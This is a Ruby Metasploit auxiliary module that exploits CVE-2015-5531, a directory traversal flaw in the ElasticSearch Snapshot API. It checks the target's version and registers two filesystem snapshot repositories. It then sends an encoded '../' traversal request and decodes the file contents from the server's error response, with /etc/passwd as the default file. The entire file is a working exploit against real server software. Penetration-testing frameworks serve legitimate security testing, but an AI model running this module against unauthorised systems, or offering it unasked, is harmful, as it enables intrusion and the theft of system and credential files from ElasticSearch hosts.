##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ElasticSearch Snapshot API Directory Traversal',
        'Description' => %q{
          'This module exploits a directory traversal vulnerability in
          ElasticSearch, allowing an attacker to read arbitrary files
          with JVM process privileges, through the Snapshot API.'
        },
        'References' => [
          ['CVE', '2015-5531'],
          ['PACKETSTORM', '132721']
        ],
        'Author' => [
          'Benjamin Smith', # Vulnerability Discovery
          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module
          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::RPORT(9200),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 7])
      ], self.class
    )
  end

  # CVE-2015-5531 affects Elasticsearch 1.0.0 through 1.6.0; 1.6.1 fixes it. Repository
  # registration succeeds on patched nodes too, so classify by the reported version instead.
  def check_host(_ip)
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    )

    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res
    return Exploit::CheckCode::Unknown("Unexpected HTTP response code: #{res.code}") unless res.code == 200

    json = res.get_json_document
    number = json.is_a?(Hash) && json['version'].is_a?(Hash) ? json['version']['number'] : nil
    return Exploit::CheckCode::Safe('Target did not identify itself as Elasticsearch') unless number && json['tagline'].to_s.include?('You Know, for Search')

    begin
      version = Rex::Version.new(number)
    rescue ArgumentError
      return Exploit::CheckCode::Unknown("Could not parse Elasticsearch version: #{number}")
    end

    if version >= Rex::Version.new('1.0.0') && version <= Rex::Version.new('1.6.0')
      return Exploit::CheckCode::Appears("Elasticsearch #{number} is affected by CVE-2015-5531 (1.0.0 - 1.6.0).")
    end

    Exploit::CheckCode::Safe("Elasticsearch #{number} is not affected by CVE-2015-5531 (1.0.0 - 1.6.0).")
  end

  # Registers the two filesystem repositories that the traversal request relies on.
  #
  # @return [Boolean] true if both repositories were acknowledged
  def create_repositories
    {
      'pwn' => 'dsr',
      'pwnie' => 'dsr/snapshot-ev1l'
    }.all? do |name, location|
      res = send_request_raw(
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '_snapshot', name),
        'ctype' => 'application/json',
        'data' => { type: 'fs', settings: { location: location } }.to_json
      )
      repository_acknowledged?(res)
    end
  end

  def read_file(file)
    travs = '_snapshot/pwn/ev1l%2f'

    payload = '../' * datastore['DEPTH']

    travs << payload.gsub('/', '%2f')
    travs << file.gsub('/', '%2f')

    vprint_status("Retrieving file contents...")

    res = send_request_raw(
      'method' => 'GET',
      'uri' => travs
    )

    unless res
      print_error("No response received from the target.")
      return nil
    end

    if res.code == 400
      return res.body
    else
      print_status("Server returned HTTP response code: #{res.code}")
      print_status(res.body)
      return nil
    end
  end

  def run_host(ip)
    vprint_status("Checking if it's a vulnerable ElasticSearch")

    check_code = check_host(ip)
    print_status(check_code.message)
    unless check_code == Exploit::CheckCode::Appears
      return
    end

    unless create_repositories
      print_error('Failed to register the snapshot repositories required for the traversal')
      return
    end

    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ %r{/^\//}

    contents = read_file(filename)
    unless contents
      print_error("No file downloaded")
      return
    end

    begin
      data_hash = JSON.parse(contents)
    rescue JSON::ParserError => e
      elog(e)
      return
    end

    fcontent = data_hash['error'].scan(/\d+/).drop(2).map(&:to_i).pack('c*')
    fname = datastore['FILEPATH']

    path = store_loot(
      'elasticsearch.traversal',
      'text/plain',
      ip,
      fcontent,
      fname
    )
    print_good("File saved in: #{path}")
  end

  private

  def repository_acknowledged?(response)
    return false unless response&.code == 200

    json = response.get_json_document
    json.is_a?(Hash) && json['acknowledged'] == true
  rescue JSON::ParserError
    false
  end
end
